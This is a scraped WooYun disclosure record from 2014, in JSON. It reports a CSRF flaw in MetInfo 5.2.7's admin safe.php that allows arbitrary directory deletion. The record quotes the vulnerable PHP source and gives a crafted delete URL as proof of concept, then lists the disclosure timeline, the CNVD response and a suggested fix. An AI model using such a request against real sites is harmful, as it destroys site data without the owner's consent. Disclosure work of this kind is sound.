{"id": 52959, "wybug_id": "wooyun-2014-069458", "wybug_title": "Metinfo一处csrf可删除任意目录", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "BadCat", "wybug_date": "2014-07-24 12:16", "wybug_open_date": "2014-10-22 12:18", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "源码审核", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-01：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-22：\t细节向公众公开  简要描述： Metinfo某漏洞可导致重装网站 详细说明：  官方最新的5.2.7 (测试通过)问题出现在 metinfo/admin/system/safe.php\n<?php# MetInfo Enterprise Content Management System # Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. require_once '../login/login_check.php';$adminfile=$url_array[count($url_array)-2];if($action==\"delete\"){\tif($filename=='update')@chmod('../../update/install.lock',0777);\tfunction deldirs($dir){\t  $dh=opendir($dir);\t  while ($file=readdir($dh)) {\t\tif($file!=\".\" && $file!=\"..\") {\t\t  $fullpath=$dir.\"/\".$file;\t\t  if(!is_dir($fullpath)) {\t\t\t  unlink($fullpath);\t\t  } else {\t\t\t  deldir($fullpath);\t\t  }\t\t}\t}\t  closedir($dh);\t  if($dir!='../../upload'){\t\tif(rmdir($dir)) {\t\treturn true;\t\t} else {\t\treturn false;\t\t}\t\t}\t} \t$dir='../../'.$filename;\tdeldirs($dir);\tmetsave('../system/safe.php?anyid='.$anyid.'&lang='.$lang);}if($action==\"modify\"){\tif($met_adminfile!=\"\"&&$met_adminfile!=$adminfile){\t\t$met_adminfile_temp=$met_adminfile;\t\t$met_adminfile_code=authcode($met_adminfile,'ENCODE', $met_webkeys);\t\trequire_once $depth.'../include/config.php';\t\tHeader(\"Location: ../index.php?lang=\".$lang.\"&action=renameadmin&adminmodify=1&met_adminfile=\".$met_adminfile_temp);\t}else{\t\trequire_once $depth.'../include/config.php';\t\tmetsave('../system/safe.php?anyid='.$anyid.'&lang='.$lang);\t}}else{$localurl=\"http://\";$localurl.=$_SERVER['HTTP_HOST'].$_SERVER[\"PHP_SELF\"];$localurl_a=explode(\"/\",$localurl);$localurl_count=count($localurl_a);$localurl_admin=$localurl_a[$localurl_count-3];$localurl_admin=$localurl_admin.\"/system/safe\";$localurl_real=explode($localurl_admin,$localurl);$localurl=$localurl_real[0];if(!is_dir('../../install'))$installstyle=\"display:none;\";if(!is_dir('../../update'))$updatestyle=\"display:none;\";$met_login_code1[$met_login_code]=\"checked='checked'\";$met_memberlogin_code1[$met_memberlogin_code]=\"checked='checked'\";$met_automatic_upgrade1[$met_automatic_upgrade]=\"checked\";$css_url=\"../templates/\".$met_skin.\"/css\";$img_url=\"../templates/\".$met_skin.\"/images\";include template('system/set_safe');footer();}# This program is an open source system, commercial use, please consciously to purchase commercial license.# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.?>\n当action为delete的时候，便可以删除任意目录（因为没CSRF防护所以可以进行CSRF攻击）可以构造CSRF请求：\nhttp://localhost/metinfo/admin/system/safe.php?anyid=12&action=delete&filename=test&lang=cn\n上面请求可删除名为'test'的目录\n\n   漏洞证明：  过后尝试发起请求，test目录就被删除了\n\n   修复方案：  增加一些防CSRF措施和只允许删除install目录   版权声明：转载请注明来源 BadCat@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-07-29 09:24 厂商回复： CNVD确认并复现所述情况，已经由CNVD根据以往建立的联系处置渠道向软件生产厂商长沙米拓公司通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}